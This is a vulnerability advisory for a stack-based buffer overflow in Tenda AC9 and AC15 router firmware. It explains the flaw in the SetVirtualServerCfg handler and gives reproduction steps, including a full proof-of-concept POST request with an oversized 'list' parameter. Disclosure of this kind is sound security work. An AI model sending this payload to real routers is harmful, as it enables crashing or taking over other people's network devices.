## Stack-based Buffer Overflow in Tenda AC9 V3.0



Vender:  Tenda

Firmware Version:  <= V15.03.06.60_EN

Exploit Author: beatjean of VARAS@IIE

Vendor Homepage:   http://www.tendacn.com/ 

Hardware Link:   https://www.tendacn.com/us/product/AC9.html 



### Description

Tenda AC9 V15.03.06.60_EN with hardware version 3 and AC15 V15.03.05.19(9061)_EN are prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a malicious POST request to /goform/SetVirtualServerCfg. 



### Vulnerability Details

This vulnerability occurs because formSetVirtualSer function retrieves the content of the 'list' sent by the user from the post request, and then using sscanf directly parse content into the stack variable.



Reproduction Steps in AC9:

1. Go to your wi-fi router gateway 
2. login with admin 
3. append 1024*'a' to the parameter "list"

```
POST /goform/SetVirtualServerCfg HTTP/1.1
Host: 192.168.0.1
Content-Length: 1078
Accept: */*
Origin: http://192.168.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.0.1/virtual_server.html?random=0.927102168325177&
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: uid=8jDWUkDgwn; bLanguage=cn; password=c90fac92f628e1c0f7df4dfc8175cbb0jup5gk
Connection: close

list=192.168.0.124,21,123,1~192.168.0.121,1723,1723,14aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```






